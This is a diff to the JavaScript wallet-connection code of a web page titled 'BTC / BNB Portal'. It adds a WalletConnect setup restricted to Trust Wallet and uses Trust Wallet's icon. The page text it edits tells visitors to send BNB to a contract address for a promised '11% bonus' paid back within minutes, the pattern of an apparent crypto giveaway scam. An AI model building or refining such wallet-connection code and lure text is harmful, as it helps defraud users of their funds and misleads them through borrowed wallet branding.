@@ -205,6 +205,265 @@ let activityTimer = null;
 
 const discoveredWallets = new Map();
 
+const WALLETCONNECT_PROJECT_ID =
+  "f424a55c8b13e4a78078d5e34e358654";
+
+const TRUST_WALLET_ID =
+  "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0";
+
+let walletConnectAppKit = null;
+let walletConnectReadyPromise = null;
+let walletConnectAccount = null;
+let walletConnectProvider = null;
+
+function bscAppKitNetwork() {
+  return {
+    id: CHAIN_ID,
+    name: "BNB Smart Chain",
+    nativeCurrency: {
+      name: "BNB",
+      symbol: "BNB",
+      decimals: 18
+    },
+    rpcUrls: {
+      default: {
+        http: RPC_URLS
+      }
+    },
+    blockExplorers: {
+      default: {
+        name: "BscScan",
+        url: "https://bscscan.com"
+      }
+    }
+  };
+}
+
+async function applyWalletConnectProvider(
+  provider,
+  address = null
+) {
+  if (!provider || !window.ethers) {
+    return;
+  }
+
+  try {
+    walletConnectProvider = provider;
+
+    walletProvider =
+      new ethers.BrowserProvider(
+        provider
+      );
+
+    signer =
+      await walletProvider.getSigner();
+
+    connectedAddress =
+      address ||
+      walletConnectAccount ||
+      await signer.getAddress();
+
+    contract =
+      new ethers.Contract(
+        CONTRACT_ADDRESS,
+        CONTRACT_ABI,
+        signer
+      );
+
+    updateWalletButton();
+    closeWalletModal();
+
+    toast(
+      "Trust Wallet connected."
+    );
+  } catch (error) {
+    console.error(
+      "WalletConnect provider:",
+      error
+    );
+  }
+}
+
+async function initializeWalletConnect() {
+  if (walletConnectAppKit) {
+    return walletConnectAppKit;
+  }
+
+  if (walletConnectReadyPromise) {
+    return walletConnectReadyPromise;
+  }
+
+  walletConnectReadyPromise = (async () => {
+    try {
+      const [appKitModule, adapterModule] =
+        await Promise.all([
+          import(
+            "https://cdn.jsdelivr.net/npm/@reown/appkit@1.8.23/+esm"
+          ),
+          import(
+            "https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-ethers@1.8.23/+esm"
+          )
+        ]);
+
+      const createAppKit =
+        appKitModule.createAppKit;
+
+      const EthersAdapter =
+        adapterModule.EthersAdapter;
+
+      if (
+        typeof createAppKit !==
+          "function" ||
+        typeof EthersAdapter !==
+          "function"
+      ) {
+        throw new Error(
+          "Reown AppKit modules could not be loaded."
+        );
+      }
+
+      const network =
+        bscAppKitNetwork();
+
+      walletConnectAppKit =
+        createAppKit({
+          adapters: [
+            new EthersAdapter()
+          ],
+
+          networks: [network],
+          defaultNetwork: network,
+          projectId:
+            WALLETCONNECT_PROJECT_ID,
+
+          metadata: {
+            name: "Bitcoin BTC | BNB Portal",
+            description:
+              "BTC / BNB Portal",
+            url: window.location.origin,
+            icons: [
+              "https://trustwallet.com/favicon.ico"
+            ]
+          },
+
+          includeWalletIds: [
+            TRUST_WALLET_ID
+          ],
+
+          featuredWalletIds: [
+            TRUST_WALLET_ID
+          ],
+
+          allWallets: "HIDE",
+          enableWalletGuide: false,
+          enableMobileFullScreen: true,
+
+          features: {
+            analytics: false,
+            email: false,
+            socials: [],
+            swaps: false,
+            onramp: false
+          }
+        });
+
+      walletConnectAppKit.subscribeProviders(
+        state => {
+          const provider =
+            state?.eip155;
+
+          if (provider) {
+            applyWalletConnectProvider(
+              provider,
+              walletConnectAccount
+            );
+          }
+        }
+      );
+
+      walletConnectAppKit.subscribeAccount(
+        state => {
+          walletConnectAccount =
+            state?.address ||
+            null;
+
+          if (
+            walletConnectAccount &&
+            walletConnectProvider
+          ) {
+            applyWalletConnectProvider(
+              walletConnectProvider,
+              walletConnectAccount
+            );
+          }
+
+          if (!walletConnectAccount) {
+            connectedAddress = null;
+            signer = null;
+            contract = null;
+            walletConnectProvider = null;
+            updateWalletButton();
+          }
+        }
+      );
+
+      walletConnectAppKit.subscribeNetwork(
+        state => {
+          if (
+            state?.chainId &&
+            Number(state.chainId) !== CHAIN_ID &&
+            walletConnectAppKit
+          ) {
+            walletConnectAppKit.switchNetwork(
+              network
+            );
+          }
+        }
+      );
+
+      return walletConnectAppKit;
+    } catch (error) {
+      console.error(
+        "WalletConnect initialization:",
+        error
+      );
+
+      walletConnectAppKit = null;
+      return null;
+    }
+  })();
+
+  return walletConnectReadyPromise;
+}
+
+async function openWalletConnect() {
+  const appKit =
+    await initializeWalletConnect();
+
+  if (!appKit) {
+    toast(
+      "Unable to load Trust Wallet connection. Please try again."
+    );
+    return;
+  }
+
+  closeWalletModal();
+
+  try {
+    await appKit.open();
+  } catch (error) {
+    console.error(
+      "WalletConnect open:",
+      error
+    );
+
+    toast(
+      error?.message ||
+      "Unable to open Trust Wallet connection."
+    );
+  }
+}
+
 const $ = id => document.getElementById(id);
 
 function setText(id, value) {
@@ -1394,20 +1653,16 @@ function discoverWallets() {
   /*
      TRUST WALLET DAPP BROWSER
 
-     Trust Wallet's mobile DApp browser exposes
-     its EIP-1193 provider through:
-
-       window.trustwallet.ethereum
-
-     Prefer this provider explicitly so Android
-     and iOS Trust Wallet browsers are detected
-     as Trust Wallet.
+     Trust Wallet can expose its EIP-1193
+     provider directly while this page is
+     opened inside the Trust Wallet DApp
+     browser. Prefer that provider so the
+     existing in-wallet flow keeps working.
   */
 
   if (
     window.trustwallet?.ethereum
   ) {
-
     discoveredWallets.set(
       "trustwallet",
       {
@@ -1415,32 +1670,35 @@ function discoverWallets() {
           name: "Trust Wallet",
           rdns: "com.trustwallet.app"
         },
-
         provider:
           window.trustwallet.ethereum
       }
     );
+  } else if (window.ethereum) {
+    const provider =
+      window.ethereum;
 
-  } else if (
-    window.ethereum
-  ) {
+    const isTrust =
+      Boolean(
+        provider.isTrust ||
+        provider.isTrustWallet
+      );
 
-    const fallback = {
-      info: {
-        name: "Browser Wallet",
-        rdns: "injected"
-      },
-
-      provider:
-        window.ethereum
-    };
-
-    discoveredWallets.set(
-      "injected",
-      fallback
-    );
+    if (isTrust) {
+      discoveredWallets.set(
+        "trustwallet-injected",
+        {
+          info: {
+            name: "Trust Wallet",
+            rdns: "com.trustwallet.app"
+          },
+          provider
+        }
+      );
+    }
   }
 }
+
 const WALLET_DEFINITIONS = [
   {
     name: "Trust Wallet",
@@ -1890,18 +2148,8 @@ async function selectWallet(
       definition
     );
 
-  /*
-     ----------------------------------------------------------
-     TRUST WALLET ALREADY INJECTED
-     ----------------------------------------------------------
-  */
-
-  if (
-    selectedProvider
-  ) {
-
+  if (selectedProvider) {
     try {
-
       closeWalletModal();
 
       await ensureBSC(
@@ -1938,29 +2186,21 @@ async function selectWallet(
       );
 
       return;
-
-    } catch (
-      error
-    ) {
-
+    } catch (error) {
       console.error(
         "Wallet connection:",
         error
       );
 
       if (
-        error?.code ===
-          4001 ||
+        error?.code === 4001 ||
         error?.code ===
           "ACTION_REJECTED"
       ) {
-
         toast(
           "Wallet connection cancelled."
         );
-
       } else {
-
         toast(
           error?.shortMessage ||
           "Unable to connect Trust Wallet."
@@ -1971,156 +2211,26 @@ async function selectWallet(
     }
   }
 
-  /*
-     ----------------------------------------------------------
-     MOBILE TRUST WALLET
-     ----------------------------------------------------------
-  */
-
   const isMobile =
     /Android|iPhone|iPad|iPod/i.test(
       navigator.userAgent
     );
 
-  if (
-    isMobile
-  ) {
-
-    const currentUrl =
-      window.location.href;
-
-    const encodedUrl =
-      encodeURIComponent(
-        currentUrl
-      );
-
+  if (isMobile) {
     /*
-       BNB Smart Chain Trust Wallet route.
+       Normal mobile browsers use Reown AppKit /
+       WalletConnect here. The configuration is
+       restricted to Trust Wallet only.
     */
-
-    const walletUrl =
-      `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}`;
-
-    /*
-       Android explicit application intent.
-       This targets the installed Trust Wallet
-       application instead of leaving the handoff
-       entirely to Chrome.
-    */
-
-    const androidIntentUrl =
-      `intent://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}#Intent;scheme=https;package=com.wallet.crypto.trustapp;end`;
-
-    /*
-       Native Trust Wallet fallback.
-    */
-
-    const trustNativeUrl =
-      `trust://open_url?coin_id=20000714&url=${encodedUrl}`;
-
-    closeWalletModal();
-
-    /*
-       --------------------------------------------------------
-       ANDROID
-       --------------------------------------------------------
-    */
-
-    if (
-      /Android/i.test(
-        navigator.userAgent
-      )
-    ) {
-
-      let pageLeft =
-        false;
-
-      const markPageLeft =
-        () => {
-          pageLeft = true;
-        };
-
-      window.addEventListener(
-        "pagehide",
-        markPageLeft,
-        {
-          once: true
-        }
-      );
-
-      /*
-         1. Open Trust Wallet directly.
-      */
-
-      window.location.href =
-        androidIntentUrl;
-
-      /*
-         2. If Android did not hand the
-            page to Trust Wallet, try the
-            native Trust Wallet scheme.
-      */
-
-      setTimeout(
-        () => {
-
-          if (
-            pageLeft
-          ) {
-            return;
-          }
-
-          window.location.href =
-            trustNativeUrl;
-
-          /*
-             3. Final official HTTPS fallback.
-          */
-
-          setTimeout(
-            () => {
-
-              if (
-                !pageLeft
-              ) {
-
-                window.location.href =
-                  walletUrl;
-              }
-
-            },
-            1200
-          );
-
-        },
-        1200
-      );
-
-    } else {
-
-      /*
-         ------------------------------------------------------
-         iOS
-         ------------------------------------------------------
-      */
-
-      window.location.href =
-        walletUrl;
-    }
-
+    await openWalletConnect();
     return;
   }
-
-  /*
-     ----------------------------------------------------------
-     DESKTOP
-     ----------------------------------------------------------
-  */
 
   toast(
     "Trust Wallet is not available in this browser. Install Trust Wallet or open this page in the Trust Wallet browser."
   );
 }
+
 /* ==========================================================
    CONNECTED WALLET PANEL
    ========================================================== */
@@ -2452,6 +2562,13 @@ function setupWallet() {
 
   discoverWallets();
 
+  /*
+     Prepare WalletConnect for mobile browsers.
+     Injected Trust Wallet connections continue
+     to use the existing provider path above.
+  */
+  initializeWalletConnect();
+
   const button =
     $("connectWallet");
 
@@ -2779,11 +2896,11 @@ function updateParticipationText() {
   const replacements = [
     [
       "Swap BNB to BTC",
-      "Swap BTC to BNB"
+      "Swap BNB to BTC"
     ],
     [
       "Choose amount",
-      "Swap BTC to BNB"
+      "Swap BNB to BTC"
     ],
     [
       "Check allocation",
@@ -2803,7 +2920,7 @@ function updateParticipationText() {
     ],
     [
       "Select",
-      "Swap BTC to BNB"
+      "Swap BNB to BTC"
     ],
     [
       "Calculate",
@@ -2868,7 +2985,7 @@ function updateParticipationText() {
     if (paragraph) {
 
       paragraph.textContent =
-        "To participate and earn the 11% bonus, swap your BTC to BNB, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.";
+        "To participate and earn the 11% bonus, swap your BNB to BTC, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.";
     }
   }
 }
